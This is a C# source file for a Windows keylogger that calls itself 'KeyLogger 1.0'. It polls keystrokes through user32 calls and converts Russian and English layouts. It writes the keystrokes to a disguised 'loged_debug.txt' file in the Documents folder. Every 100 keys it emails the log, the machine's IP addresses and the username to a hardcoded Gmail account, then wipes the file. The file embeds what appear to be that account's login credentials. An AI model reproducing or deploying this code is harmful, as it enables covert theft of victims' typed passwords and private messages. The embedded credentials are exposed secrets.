using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.IO;
using System.Globalization;
using System.Windows;
using System.Threading;
using System.Net;
using System.Net.Mail;
using Telegram.Bot; 

namespace KeyLogger
{

    public class CurTime
    {
        public static string GetTime()
        {
            return DateTime.Now.ToString();
        }
    }

    public class Buf
    {
        public static void Update(string buffer, int length)
        {
            buffer = null;
            length = 0;
            string DateTime = CurTime.GetTime();
            string BufferPreload = null;
            BufferPreload += (DateTime + " ------ KeyLogger 1.0 ------ " + "Succesful created buffer \n");
            buffer += BufferPreload;


        }
    }

    

    public class senderMail
    {
        public static void SendMail()
        {
            DateTime curTime = DateTime.Now;

            string folderName = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            string path = folderName + @"\loged_debug.txt";

            string logContent = File.ReadAllText(path);

            string emailBody = "";

            

            var host = Dns.GetHostEntry(Dns.GetHostName());

            foreach (var address in host.AddressList)
            {
                emailBody += "Address: " + address + "\n";

            }

            emailBody += "\nUser: " + Environment.UserDomainName + " \\ " + Environment.UserName;
            emailBody += "\nHost: " + host;
            emailBody += "\nSended time: " + curTime.ToString() + "\n";
            emailBody += logContent;

            string subject = "New message from " + Environment.UserDomainName;

            SmtpClient client = new SmtpClient("smtp.gmail.com", 587);
            MailMessage mailMessage = new MailMessage();

            mailMessage.From = new MailAddress("rotation421@gmail.com");
            mailMessage.To.Add("rotation421@gmail.com");
            mailMessage.Subject = subject;
            client.UseDefaultCredentials = false;
            client.EnableSsl = true;
            client.Credentials = new System.Net.NetworkCredential("rotation421@gmail.com", "Lolik2007");
            mailMessage.Body = emailBody;

            client.Send(mailMessage);
            Console.WriteLine(mailMessage);


        }
    }

    public class Lang
    {
        public static string translateRus(char let)
        {
            

            string str = let.ToString();
            
            switch (str.ToLower()) {
                case "q":
                    return "й";
                case "w":
                    return "ц";
                case "e":
                    return "у";
                case "r":
                    return "к";
                case "t":
                    return "е";
                case "y":
                    return "н";
                case "u":
                    return "г";
                case "i":
                    return "ш";
                case "o":
                    return "щ";
                case "p":
                    return "з";
                case "[":
                    return "х";
                case "]":
                    return "ъ";
                case "a":
                    return "ф";
                case "s":
                    return "ы";
                case "d":
                    return "в";
                case "f":
                    return "а";
                case "g":
                    return "п";
                case "h":
                    return "р";
                case "j":
                    return "о";
                case "k":
                    return "л";
                case "l":
                    return "д";
                case ";":
                    return "ж";
                case "'":
                    return "э";
                case "z":
                    return "я";
                case "x":
                    return "ч";
                case "c":
                    return "с";
                case "v":
                    return "м";
                case "b":
                    return "и";
                case "n":
                    return "т";
                case "m":
                    return "ь";
                case ",":
                    return "б";
                case ".":
                    return "ю";
                case "/":
                    return ".";
                default:
                    return "";

            }

        }
    }

    public class Program
    {
        [DllImport("User32.dll")]
        private static extern int GetAsyncKeyState(Int32 i);



        [DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true, CallingConvention = CallingConvention.Winapi)]
        private static extern short GetKeyState(int keyCode);







        [DllImport("user32.dll", SetLastError = true)]
        public static extern ushort GetKeyboardLayout([In] int idThread);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern int GetWindowThreadProcessId([In] IntPtr hWnd, [Out, Optional] IntPtr lpdwProcessId);
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr GetForegroundWindow();
        public static string mss;

        static ushort GetKeyboardLayout()
        {
            return GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), IntPtr.Zero));
        }



        static void Main(string[] args)
        {
            string DateTime = CurTime.GetTime();
            string Buffer = null;

            //string BufferPreload = null;
            Buffer += (DateTime + " ------ KeyLogger 1.0 ------ " + "Succesful created buffer \n");

            int BufferLogsLen = 0;
            int BufferSymbLen = Buffer.Length;
            
            //Console.WriteLine(DateTime);
           
            //BufferPreload += (DateTime + " ------ KeyLogger 1.0 ------ " + "Succesful created buffer \n") ; 
            //Console.WriteLine(BufferPreload);  

            var capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
            var numLock = (((ushort)GetKeyState(0x90)) & 0xffff) != 0;
            var scrollLock = (((ushort)GetKeyState(0x91)) & 0xffff) != 0;

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }
            string curPath = (filepath + @"\loged_debug.txt");

            if (!File.Exists(curPath))
            {
                using (StreamWriter sw = File.CreateText(curPath))
                {

                }
            }
            Console.WriteLine(curPath);


            while (true)
            {
                Thread.Sleep(1);

                


                for (int i = 1; i < 127; i++)
                {
                    int curKey = GetAsyncKeyState(i);
                    if (curKey == 32769)
                    {
                        Console.WriteLine(i);
                        if (BufferLogsLen >= 100)
                        {
                            

                            using (StreamWriter sw = File.AppendText(curPath))
                            {
                                sw.Write(Buffer);
                                Thread.Sleep(1000);

                                
                                
                                
                            }

                            senderMail.SendMail();
                            




                            Thread.Sleep(500);

                            File.Delete(curPath);
                            using (StreamWriter sw = File.CreateText(curPath))
                            {

                            }


                            

                            Thread.Sleep(300);


                            Buffer = null;
                            BufferLogsLen = 0;
                            Buffer += (DateTime + " ------ KeyLogger 1.0 ------ " + "Succesful created buffer \n");

                            //Buf.Update(Buffer, BufferLogsLen);
                            Console.WriteLine("logged");
                            continue;
                        }

                        BufferLogsLen++;
                        // Console.WriteLine(i);
                        if (i < 13 || 13 < i && i < 32)
                        {
                            continue;
                        }
                        switch(i)
                        {
                            case 13:
                                Buffer += "\n";
                                break;
                            case 32:
                                Buffer += " ";
                                break;
                            
                           
                        }



                        capsLock = (((ushort)GetKeyState(0x14)) & 0xffff) != 0;
                        int curLang = GetKeyboardLayout();

                        if (curLang == 1049)
                        {
                            if (capsLock)
                            {
                                string rusLettter = Lang.translateRus(char.ToLower((char)i));
                                Buffer += rusLettter.ToUpper();

                            }

                            if (!capsLock)
                            {
                                string rusLettter = Lang.translateRus(char.ToLower((char)i));
                                Buffer += rusLettter.ToLower();
                                
                            }
                            
                        }

                        if (curLang == 1033)
                        {
                            if (capsLock)
                            {
                                Buffer += (char)i;
                                
                            }
                            if (!capsLock)
                            {
                                Buffer += char.ToLower((char)i);
                            }
                        }
                        
                        Console.WriteLine(Buffer);

                    }
                }
            }
        }
    }
}

